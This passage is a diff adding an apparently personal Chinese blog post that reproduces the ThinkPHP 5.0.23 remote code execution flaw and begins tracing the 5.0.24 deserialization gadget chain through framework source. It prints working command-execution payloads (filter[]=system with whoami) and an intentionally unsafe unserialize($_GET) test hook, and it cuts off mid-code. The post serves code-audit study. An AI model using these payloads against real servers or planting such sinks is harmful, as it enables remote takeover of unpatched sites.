@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9\/",
+  "keywords":"[thinkphp]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="thinkphp">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp大杂烩">
+<meta name="twitter:title" content="Thinkphp大杂烩">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-06T20:05:31">
+  
+  
+    <meta property="article:modified_time" content="2023-08-06T20:05:31">
+  
+  
+  
+    
+      <meta property="article:section" content="代码审计">
+    
+  
+  
+    
+      <meta property="article:tag" content="thinkphp">
+    
+      <meta property="article:tag" content="代码审计">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/8.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/8.png">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/5.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/5.jpeg">
+
+
+    <title>Thinkphp大杂烩</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/8.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      Thinkphp大杂烩
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-06T20:05:31&#43;08:00">
+        
+  八月 6, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1">代码审计</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#thinkphp50x">thinkphp5.0.x</a>
+      <ul>
+        <li><a href="#配置环境">配置环境</a></li>
+        <li><a href="#基础知识">基础知识</a></li>
+        <li><a href="#thinkphp5023-rce漏洞">thinkphp5.0.23 rce漏洞</a></li>
+        <li><a href="#thinkphp5024反序列化漏洞">thinkphp5.0.24反序列化漏洞</a></li>
+      </ul>
+    </li>
+    <li><a href="#thinkphp51x">thinkphp5.1.x</a></li>
+  </ul>
+</nav>
+
+<p>之前审过，没怎么做笔记，再审一下，主要还是复现一下。。</p>
+<h1 id="thinkphp50x">thinkphp5.0.x</h1>
+<h2 id="配置环境">配置环境</h2>
+<p><a href="https://www.kancloud.cn/manual/thinkphp5/118006">安装ThinkPHP · ThinkPHP5.0完全开发手册 · 看云 (kancloud.cn)</a></p>
+<p>安装方法可以用composer，参考上面链接，composer可以在phpstudy上下</p>
+<pre tabindex="0"><code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
+composer create-project topthink/think=5.0.*   --prefer-dist
+</code></pre><p>版本可以通过改composer.json完成</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805010821043.png" alt="image-20230805010821043"></p>
+<p>在当前目录下运行</p>
+<pre tabindex="0"><code>composer install
+</code></pre><p>如果rce不通的话，再装个captcha模块，tp5.0的版本是使用1.<em>，tp5.1的版本是使用2.</em></p>
+<pre tabindex="0"><code>composer require topthink/think-captcha 1.*
+</code></pre><p>结合phpstudy和phpstorm进行调试</p>
+<h2 id="基础知识">基础知识</h2>
+<p>thinkphp的目录结构：</p>
+<pre tabindex="0"><code>project  应用部署目录
+├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+├─extend                扩展类库目录（可定义）
+├─public                WEB 部署目录（对外访问目录）
+│  ├─static             静态资源存放目录(css,js,image)
+│  ├─index.php          应用入口文件
+│  ├─router.php         快速测试文件
+│  └─.htaccess          用于 apache 的重写
+├─runtime               应用的运行时目录（可写，可设置）
+├─vendor                第三方类库目录（Composer）
+├─thinkphp              框架系统目录
+│  ├─lang               语言包目录
+│  ├─library            框架核心类库目录
+│  │  ├─think           Think 类库包目录
+│  │  └─traits          系统 Traits 目录
+│  ├─tpl                系统模板目录
+│  ├─.htaccess          用于 apache 的重写
+│  ├─.travis.yml        CI 定义文件
+│  ├─base.php           基础定义文件
+│  ├─composer.json      composer 定义文件
+│  ├─console.php        控制台入口文件
+│  ├─convention.php     惯例配置文件
+│  ├─helper.php         助手函数文件（可选）
+│  ├─LICENSE.txt        授权说明文件
+│  ├─phpunit.xml        单元测试配置文件
+│  ├─README.md          README 文件
+│  └─start.php          框架引导文件
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+</code></pre><p>get传参s</p>
+<p>我们知道可以通过<code>http://127.0.0.1/public/index.php?s=index</code>的方式通过<code>s</code>参数传递具体的路由。</p>
+<h2 id="thinkphp5023-rce漏洞">thinkphp5.0.23 rce漏洞</h2>
+<p>payload如下：</p>
+<pre tabindex="0"><code>http://thinkphp5023/?s=captcha
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami
+</code></pre><p>借用网上的一张图梳理一下大概流程</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805135515666.png" alt="image-20230805135515666"></p>
+<p>知道大概流程后开始详细分析，从漏洞点开始着手，一步步往上走</p>
+<p>定位到</p>
+<p><code>thinkphp\library\think\Request.php</code>中</p>
+<p>漏洞点是在<code>call_user_func</code></p>
+<pre tabindex="0"><code>    private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            } elseif (is_scalar($value)) {
+                if (false !== strpos($filter, &#39;/&#39;)) {
+                    // 正则过滤
+                    if (!preg_match($filter, $value)) {
+                        // 匹配不成功返回默认值
+                        $value = $default;
+                        break;
+                    }
+                } elseif (!empty($filter)) {
+                    // filter函数不存在时, 则使用filter_var进行过滤
+                    // filter为非整形值时, 调用filter_id取得过滤id
+                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                    if (false === $value) {
+                        $value = $default;
+                        break;
+                    }
+                }
+            }
+        }
+        return $this-&gt;filterExp($value);
+    }
+</code></pre><p>哪里有调用<code>filterValue</code>的地方呢</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805170323538.png" alt="image-20230805170323538"></p>
+<p>其实也不算多，一个个翻一下，发现<code>input</code>方法</p>
+<pre tabindex="0"><code>    public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (false === $name) {
+            // 获取原始数据
+            return $data;
+        }
+        $name = (string) $name;
+        if (&#39;&#39; != $name) {
+            // 解析name
+            if (strpos($name, &#39;/&#39;)) {
+                list($name, $type) = explode(&#39;/&#39;, $name);
+            } else {
+                $type = &#39;s&#39;;
+            }
+            // 按.拆分成多维数组进行判断
+            foreach (explode(&#39;.&#39;, $name) as $val) {
+                if (isset($data[$val])) {
+                    $data = $data[$val];
+                } else {
+                    // 无输入数据，返回默认值
+                    return $default;
+                }
+            }
+            if (is_object($data)) {
+                return $data;
+            }
+        }
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            reset($data);
+        } else {
+            $this-&gt;filterValue($data, $name, $filter);
+        }
+
+        if (isset($type) &amp;&amp; $data !== $default) {
+            // 强制类型转换
+            $this-&gt;typeCast($data, $type);
+        }
+        return $data;
+    }
+</code></pre><p>在这里我们控制<code>$data</code>和<code>$filter</code>就可以实现rce,控制，这里的filter由<code>getFilter</code>函数控制</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805173254376.png" alt="image-20230805173254376"></p>
+<p>跟进去，可以知道<code>$filter</code>与类属性的<code>$filter</code>值相同，那么我们只要控制类中属性<code>$filter</code>的值即可，我们再看看<code>$data</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805173527170.png" alt="image-20230805173527170"></p>
+<p>发现$data是由传进来的<code>$data</code>和<code>name</code>决定</p>
+<p>那么看看哪里用到了<code>input</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805171118379.png" alt="image-20230805171118379"></p>
+<p>payload中选择的是870行的<code>server</code>函数</p>
+<pre tabindex="0"><code>    public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (empty($this-&gt;server)) {
+            $this-&gt;server = $_SERVER;
+        }
+        if (is_array($name)) {
+            return $this-&gt;server = array_merge($this-&gt;server, $name);
+        }
+        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
+    }
+</code></pre><p>这里我们需要控制的是<code>$this-&gt;server</code>和<code>$name</code>,<code>$this-&gt;server</code>就是该类的server属性</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805174023071.png" alt="image-20230805174023071"></p>
+<p>继续往上找，可以看到<code>method</code>函数是有调用<code>server</code>函数的</p>
+<pre tabindex="0"><code>    public function method($method = false)
+    {
+        if (true === $method) {
+            // 获取原始请求类型
+            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        } elseif (!$this-&gt;method) {
+            if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
+                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+                $this-&gt;{$this-&gt;method}($_POST);
+            } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
+                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
+            } else {
+                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+            }
+        }
+        return $this-&gt;method;
+    }
+</code></pre><p>现在我们看method函数是怎么运行的。</p>
+<p>调试中不难发现method函数是先进入分支，要进入下一个<code>if</code>则需要要设置<code>_method</code>的值，我们可以将其设置成<code>__construct</code>,为什么要设置成<code>__construct</code>，因为<code>__construct</code>函数可以实现变量覆盖</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805195141561.png" alt="image-20230805195141561"></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805180851240.png" alt="image-20230805180851240"></p>
+<p>继续跟进去</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805180935409.png" alt="image-20230805180935409"></p>
+<p>进去是<code>__construct</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805181008743.png" alt="image-20230805181008743"></p>
+<p>在Request类中，在<code>__construct</code>函数中存在变量覆盖，可以覆盖<code>Request</code>类中的<code>filter</code>属性和<code>server</code>属性</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805181134119.png" alt="image-20230805181134119"></p>
+<p>回归到最初问题，我们是要调用<code>server</code>函数的，那么<code>method</code>就是要为true的</p>
+<p>调试中，我们可以看到<code>param</code>函数中，调用了method方法，且参数为true</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806010443676.png" alt="image-20230806010443676"></p>
+<p>那看哪里调用了param函数，App.php中exec函数就调用了param函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806010907416.png" alt="image-20230806010907416"></p>
+<p>而App.php中run函数就调用了exec函数</p>
+<p>thinkphp程序都是从App.php开始的，那我们分析一下run函数，在run方法中进入<code>routecheck</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805235142101.png" alt="image-20230805235142101"></p>
+<p>在routecheck中跟进Route::check</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805235609679.png" alt="image-20230805235609679"></p>
+<p>里面调用了method函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230805235725916.png" alt="image-20230805235725916"></p>
+<p>这里method函数运行完需要一个值，我们就可以令method=get,使代码正常运行，往下走就是接着上面的exec函数</p>
+<p>所以post传参就为</p>
+<pre tabindex="0"><code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami
+</code></pre><p>总体流程就如下：</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806002845809.png" alt="image-20230806002845809"></p>
+<p>还有另外一条路的payload是</p>
+<pre tabindex="0"><code>http://thinkphp5023/index.php?s=captcha
+post:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
+</code></pre><p>注：如果开了debug模式的话，就可以不用get传参,直接</p>
+<pre tabindex="0"><code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami
+</code></pre><p>修复：在method这里加了白名单进行过滤</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806012225401.png" alt="image-20230806012225401"></p>
+<p>参考：</p>
+<p>[<a href="https://blog.csdn.net/solitudi/article/details/113796433">框架漏洞]ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析_tp5.0.23 rce 分析_Y4tacker的博客-CSDN博客</a></p>
+<p><a href="https://assassins-white.github.io/2021/12/31/ThinkPHP5-0-23-RCE-Debug%E5%85%B3%E9%97%AD-%E5%85%8D%E8%B4%B9%E5%AE%9D%E5%A1%94-PHP7/">https://assassins-white.github.io/2021/12/31/ThinkPHP5-0-23-RCE-Debug%E5%85%B3%E9%97%AD-%E5%85%8D%E8%B4%B9%E5%AE%9D%E5%A1%94-PHP7/</a></p>
+<p><a href="https://www.freebuf.com/vuls/307413.html">thinkphp5.0.23变量覆盖导致的RCE分析与复现 - FreeBuf网络安全行业门户</a></p>
+<p><a href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/?tdsourcetag=s_pctim_aiomsg">ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析 – 绿盟科技技术博客 (nsfocus.net)</a></p>
+<h2 id="thinkphp5024反序列化漏洞">thinkphp5.0.24反序列化漏洞</h2>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806111813633.png" alt="image-20230806111813633"></p>
+<pre tabindex="0"><code>composer install
+</code></pre><p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806112241412.png" alt="image-20230806112241412"></p>
+<p>加上反序列化点</p>
+<pre tabindex="0"><code>$a = unserialize($_GET[&#39;a&#39;]);
+var_dump($a);
+</code></pre><p>先放出网上的流程图</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/2dc39a74112c48508c685572e4395a36.png" alt="2dc39a74112c48508c685572e4395a36"></p>
+<pre tabindex="0"><code>\thinkphp\library\think\process\pipes\Windows.php
+</code></pre><p>起点在<code>__destruct</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806123403783.png" alt="image-20230806123403783"></p>
+<p>跟进<code>removeFiles</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806123731485.png" alt="image-20230806123731485"></p>
+<p>我们可以看到这里有个<code>file_exists</code>,<code>$filename</code>我们可控,只需控制<code>$filename</code>为一个对象，那么就会触发<code>__tostring</code>方法，找一下<code>__tostring</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806124120367.png" alt="image-20230806124120367"></p>
+<p>我们选择用Model类的<code>__tostring</code>方法，而Model类是个抽象类</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806124436461.png" alt="image-20230806124436461"></p>
+<p>什么是抽象类？PHP 有抽象类和抽象方法。定义为抽象的类不能被实例化。</p>
+<p>所以我们要寻找看谁继承了抽象类</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806124718744.png" alt="image-20230806124718744"></p>
+<p>我们可以选择<code>pivot</code>类</p>
+<p>所以<code>$this-&gt;files=[new Pivot()]</code></p>
+<p>然后我们就进入Model类的<code>__tostring方法</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806145542461.png" alt="image-20230806145542461"></p>
+<p>跟进<code>toJson</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806145627067.png" alt="image-20230806145627067"></p>
+<p>跟进<code>toArray</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">toArray</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $item    <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        $visible <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        $hidden  <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_merge</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">relation</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 过滤属性
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">visible</span>)) {
+</span></span><span style="display:flex;"><span>            $array <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseAttr</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">visible</span>, $visible);
+</span></span><span style="display:flex;"><span>            $data  <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_intersect_key</span>($data, <span style="color:#a6e22e">array_flip</span>($array));
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">elseif</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hidden</span>)) {
+</span></span><span style="display:flex;"><span>            $array <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseAttr</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hidden</span>, $hidden, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>            $data  <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_diff_key</span>($data, <span style="color:#a6e22e">array_flip</span>($array));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($data <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $val) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($val <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">Model</span> <span style="color:#f92672">||</span> $val <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">ModelCollection</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// 关联模型对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                $item[$key] <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">subToArray</span>($val, $visible, $hidden, $key);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">is_array</span>($val) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">reset</span>($val) <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">Model</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// 关联模型数据集
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                $arr <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">foreach</span> ($val <span style="color:#66d9ef">as</span> $k <span style="color:#f92672">=&gt;</span> $value) {
+</span></span><span style="display:flex;"><span>                    $arr[$k] <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">subToArray</span>($value, $visible, $hidden, $key);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                $item[$key] <span style="color:#f92672">=</span> $arr;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// 模型属性
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                $item[$key] <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAttr</span>($key);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 追加属性（必须定义获取器）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">foreach</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span> <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $name) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_array</span>($name)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// 追加关联对象属性
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    $relation   <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAttr</span>($key);
+</span></span><span style="display:flex;"><span>                    $item[$key] <span style="color:#f92672">=</span> $relation<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>($name)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">toArray</span>();
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">strpos</span>($name, <span style="color:#e6db74">&#39;.&#39;</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">list</span>($key, $attr) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;.&#39;</span>, $name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// 追加关联对象属性
